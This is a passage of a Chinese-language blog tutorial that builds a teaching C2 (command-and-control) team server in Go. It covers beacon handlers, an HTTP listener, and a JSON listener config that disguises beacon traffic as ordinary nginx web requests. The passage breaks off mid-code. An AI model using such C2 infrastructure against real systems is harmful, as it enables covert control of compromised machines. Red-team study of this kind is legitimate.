<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/controller&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/handler&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/logs&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/profile&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/utils/safeType&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span>    </span><br><span class="line">    <span class="string">&quot;go.uber.org/zap&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewTeamServer</span><span class="params">()</span></span> *TeamServer &#123;  </span><br><span class="line">    ts := &amp;TeamServer&#123;  </span><br><span class="line">       Profile:   profile.NewProfile(),  </span><br><span class="line">       Listeners: safeType.NewMap(),  </span><br><span class="line">       Beacons:   safeType.NewMap(),  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ts.Handler = handler.NewHandler(ts)  </span><br><span class="line">    <span class="keyword">return</span> ts  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> SetProfile(path <span class="type">string</span>) <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    fileContent, err := os.ReadFile(path)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    err = json.Unmarshal(fileContent, &amp;ts.Profile)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> Start() &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> stopped = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>) <span class="comment">// 初始化 stopped 通道  </span></span><br><span class="line">  </span><br><span class="line">    ts.Controller = controller.NewController(ts, *ts.Profile)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">go</span> ts.Controller.StartServer(&amp;stopped)  </span><br><span class="line">  </span><br><span class="line">    logs.Logger.Info(<span class="string">&quot;OneServer started -&gt; &quot;</span>, zap.String(<span class="string">&quot;address&quot;</span>,  </span><br><span class="line">       ts.Profile.TeamServerConfig.Host),  </span><br><span class="line">       zap.Int(<span class="string">&quot;port&quot;</span>, ts.Profile.TeamServerConfig.Port))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 等待服务启动或超时  </span></span><br><span class="line">    &lt;-stopped  </span><br><span class="line">    logs.Logger.Info(<span class="string">&quot;Server stopped gracefully&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 关闭服务器  </span></span><br><span class="line">    os.Exit(<span class="number">0</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/handler.go</code>：定义了一个 <code>NewHandler</code> 函数初始化了一个 <code>Handler</code> 实例，并注册了 <code>Beacon-HTTP</code> 监听器处理器和 <code>Beacon</code> 处理器，为后续的业务逻辑处理做好了准备。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> handler  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/handler/beacon&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/handler/listener&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewHandler</span><span class="params">(teamserver any)</span></span> *Handler &#123;  </span><br><span class="line">    h := &amp;Handler&#123;  </span><br><span class="line">       ListenerHandlers: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]ListenerHandler),  </span><br><span class="line">       BeaconHandlers:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]BeaconHandler),  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建并注册 Beacon-HTTP 监听器  </span></span><br><span class="line">    h.ListenerHandlers[<span class="string">&quot;Beacon-HTTP&quot;</span>] = listener.NewBeaconHTTPListener(teamserver).(ListenerHandler)  </span><br><span class="line">    h.BeaconHandlers[<span class="string">&quot;Beacon&quot;</span>] = beacon.NewBeaconHandler(teamserver).(BeaconHandler)  </span><br><span class="line">    <span class="keyword">return</span> h  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_type.go</code>。后续再补充需要用到的接口方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> ListenerHTTP <span class="keyword">struct</span> &#123;  </span><br><span class="line">    ts TeamServer  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_main.go</code>。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    listenerHTTP *ListenerHTTP  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBeaconHTTPListener</span><span class="params">(ts any)</span></span> any &#123;  </span><br><span class="line">    listenerHTTP = &amp;ListenerHTTP&#123;  </span><br><span class="line">       ts: ts.(TeamServer),  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> listenerHTTP  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/types.go</code>。后续再补充需要用到的接口方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> beacon  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">struct</span> &#123;  </span><br><span class="line">    ts TeamServer  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_main.go</code> 实现NewBeaconHandler方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> beacon  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    beaconHandler *BeaconHandler  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBeaconHandler</span><span class="params">(ts any)</span></span> any &#123;  </span><br><span class="line">    beaconHandler = &amp;BeaconHandler&#123;  </span><br><span class="line">       ts: ts.(TeamServer),  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> beaconHandler  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>controller/controller.go</code> 需要补充一个StartServer方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> StartServer(finished *<span class="keyword">chan</span> <span class="type">bool</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    host := fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, c.Host, c.Port)  </span><br><span class="line">  </span><br><span class="line">    err := c.Engine.RunTLS(host, c.Cert, c.Key)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 发送错误结束  </span></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;Failed to start server&quot;</span>, zap.Error(err))  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 正常结束  </span></span><br><span class="line">    *finished &lt;- <span class="literal">true</span>  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>main.go</code> 程序入口点</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/logs&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/server&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> profilePath <span class="type">string</span>  </span><br><span class="line">    profilePath = <span class="string">&quot;./profile.json&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    ts := server.NewTeamServer()  </span><br><span class="line">    <span class="keyword">if</span> profilePath != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       err := ts.SetProfile(profilePath)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          log.Fatalf(<span class="string">&quot;Error loading profile: %v&quot;</span>, err)  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ts.Profile.Validate()  </span><br><span class="line">  </span><br><span class="line">      </span><br><span class="line">    logs.Logger = logs.InitLogger(ts.Profile.ZapConfig)  </span><br><span class="line">  </span><br><span class="line">    ts.Start()  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure>

<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/25/19-50-21-a3b9a27d1d8f01252d5257c9c5222bcd-20250725195020-78c777.png"></p>
<h2 id="1-6-一个简单的接口测试"><a href="#1-6-一个简单的接口测试" class="headerlink" title="1.6 一个简单的接口测试"></a>1.6 一个简单的接口测试</h2><p>这是一个简单的C2框架，为了省事，我并未实现GUI客户端以完成接口测试，而是用API测试工具<strong>Postman</strong>来完成功能验证，这也是现代前后端分别开发的基本思路。测试的工具还有<strong>Apifox</strong>和<strong>Reqable</strong>，你还可以用<strong>bp、yakit、hackbar</strong>，甚至写个python脚本进行测试，怎么舒服怎么来。</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/25/19-59-41-71063544a2647fe57351bf59e4c32d18-20250725195940-c692db.png"></p>
<h1 id="二、监听器配置和监听器启动"><a href="#二、监听器配置和监听器启动" class="headerlink" title="二、监听器配置和监听器启动"></a>二、监听器配置和监听器启动</h1><h2 id="2-1-大致流程"><a href="#2-1-大致流程" class="headerlink" title="2.1 大致流程"></a>2.1 大致流程</h2><p>大致流程：</p>
<ol>
<li><code>controller.InitRouter</code>：注册一条路由”&#x2F;listener&#x2F;create”，并由controller.ListenerStart处理</li>
<li><code>controller.ListenerStart</code>：负责接收<strong>启动监听器</strong>的请求并做校验、日志记录、业务调用和返回响应</li>
<li><code>TeamServer.ListenerStart</code>：先判断是否有同名监听器如果有则返回错误，因为我们以监听器的名称作为map的“键”，再委托底层handler实现启动，最后把元数据缓存起来。</li>
<li><code>Handler.ListenerStart</code>：根据configType找到对应的ListenerHandler处理者，先做参数校验，再真正启动监听器。</li>
<li><code>ListenerHTTP.ListenerStart</code>：HandlerListenerDataAndStart真正创建并启动监听器，最后把运行中的实例放进全局列表中以备后续使用，最后返回listenerData。这个结果是用来将创建的listener数据同步到所有client中的，这个功能我并未在教学项目中实现。</li>
<li><code>ListenerHTTP.HandlerListenerDataAndStart</code>：拿配置，填默认值，生成随机密钥，然后创建一个http服务器，最后返回listenerdata数据</li>
<li><code>HTTP.Start</code>：根据SSL选项启动HTTP服务器还是HTTPS服务器</li>
</ol>
<p>监听器的配置通常采用json描述监听器参数（类型、监听地址、端口、TLS 证书等），下面就是本项目采用的json监听器配置的例子</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http_listener_01&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Beacon-HTTP&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;host_bind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;port_bind&quot;</span><span class="punctuation">:</span> <span class="number">9000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;callback_addresses&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;192.168.1.1:9000&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;192.168.1.100:8082&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ssl&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ssl_cert&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ssl_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ssl_cert_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ssl_key_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/index.php&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hb_header&quot;</span><span class="punctuation">:</span> <span class="string">&quot;X-Session-Id&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;hb_prefix&quot;</span><span class="punctuation">:</span><span class="string">&quot;SESSIONID=&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;user_agent&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;host_header&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.1.1:9000&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;request_headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;response_headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nginx&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Content-Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x_forwarded_for&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;page_error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;html&gt;&lt;body&gt;error&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;page_payload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;&lt;&lt;PAYLOAD_DATA&gt;&gt;&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;server_headers&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;encrypt_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;01234567890123456789&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-2-代码编写"><a href="#2-2-代码编写" class="headerlink" title="2.2 代码编写"></a>2.2 代码编写</h2><p><code>controller/controller.go</code> 增加一条”&#x2F;listener&#x2F;create”路由</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> InitRouter() &#123;  </span><br><span class="line">  </span><br><span class="line">    apiGroup := c.Engine.Group(c.Endpoint)  </span><br><span class="line">  </span><br><span class="line">    apiGroup.GET(<span class="string">&quot;/test&quot;</span>, c.Test)  </span><br><span class="line">    apiGroup.POST(<span class="string">&quot;/listener/create&quot;</span>, c.ListenerStart)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>controller/types.go</code> controller需要用到TeamServer的ListenerStart方法，所以在接口处定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    ListenerStart(listenerName <span class="type">string</span>, configType <span class="type">string</span>, config request.ConfigDetail) <span class="type">error</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/request/listener.go</code> 前端传过来json的数据绑定到ListenerConfig结构体中</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> request  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> ListenerConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    ListenerName <span class="type">string</span>       <span class="string">`json:&quot;name&quot;`</span>  </span><br><span class="line">    ConfigType   <span class="type">string</span>       <span class="string">`json:&quot;type&quot;`</span>  </span><br><span class="line">    Config       ConfigDetail <span class="string">`json:&quot;config&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> ConfigDetail <span class="keyword">struct</span> &#123;  </span><br><span class="line">    HostBind          <span class="type">string</span>            <span class="string">`json:&quot;host_bind&quot;`</span>  </span><br><span class="line">    PortBind          <span class="type">int</span>               <span class="string">`json:&quot;port_bind&quot;`</span>  </span><br><span class="line">    CallbackAddresses []<span class="type">string</span>          <span class="string">`json:&quot;callback_addresses&quot;`</span>  </span><br><span class="line">    SSL               <span class="type">bool</span>              <span class="string">`json:&quot;ssl&quot;`</span>  </span><br><span class="line">    SSLCert           []<span class="type">byte</span>            <span class="string">`json:&quot;ssl_cert&quot;`</span>  </span><br><span class="line">    SSLKey            []<span class="type">byte</span>            <span class="string">`json:&quot;ssl_key&quot;`</span>  </span><br><span class="line">    SSLCertPath       <span class="type">string</span>            <span class="string">`json:&quot;ssl_cert_path&quot;`</span>  </span><br><span class="line">    SSLKeyPath        <span class="type">string</span>            <span class="string">`json:&quot;ssl_key_path&quot;`</span>  </span><br><span class="line">    URI               <span class="type">string</span>            <span class="string">`json:&quot;uri&quot;`</span>  </span><br><span class="line">    HBHeader          <span class="type">string</span>            <span class="string">`json:&quot;hb_header&quot;`</span>  </span><br><span class="line">    HBPrefix          <span class="type">string</span>            <span class="string">`json:&quot;hb_prefix&quot;`</span>  </span><br><span class="line">    UserAgent         <span class="type">string</span>            <span class="string">`json:&quot;user_agent&quot;`</span>  </span><br><span class="line">    HostHeader        <span class="type">string</span>            <span class="string">`json:&quot;host_header&quot;`</span>  </span><br><span class="line">    RequestHeaders    <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;request_headers&quot;`</span>  </span><br><span class="line">    ResponseHeaders   <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;response_headers&quot;`</span>  </span><br><span class="line">    XForwardedFor     <span class="type">bool</span>              <span class="string">`json:&quot;x_forwarded_for&quot;`</span>  </span><br><span class="line">    PageError         <span class="type">string</span>            <span class="string">`json:&quot;page_error&quot;`</span>  </span><br><span class="line">    PagePayload       <span class="type">string</span>            <span class="string">`json:&quot;page_payload&quot;`</span>  </span><br><span class="line">    ServerHeaders     <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;server_headers&quot;`</span>  </span><br><span class="line">    Protocol          <span class="type">string</span>            <span class="string">`json:&quot;protocol&quot;`</span>  </span><br><span class="line">    EncryptKey        <span class="type">string</span>            <span class="string">`json:&quot;encrypt_key&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>controller/listener.go</code>：参数绑定与业务调用</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/logs&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>    </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>    </span><br><span class="line">    <span class="string">&quot;go.uber.org/zap&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/http&quot;</span>    </span><br><span class="line">    <span class="string">&quot;regexp&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> ListenerStart(ctx *gin.Context) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       listenerConfig request.ListenerConfig  </span><br><span class="line">       err            <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    err = ctx.ShouldBindJSON(&amp;listenerConfig)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;Error in binding JSON data: &quot;</span>, zap.Error(err))  </span><br><span class="line">       ctx.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: err.Error()&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> ValidListenerName(listenerConfig.ListenerName) == <span class="literal">false</span> &#123;  </span><br><span class="line">       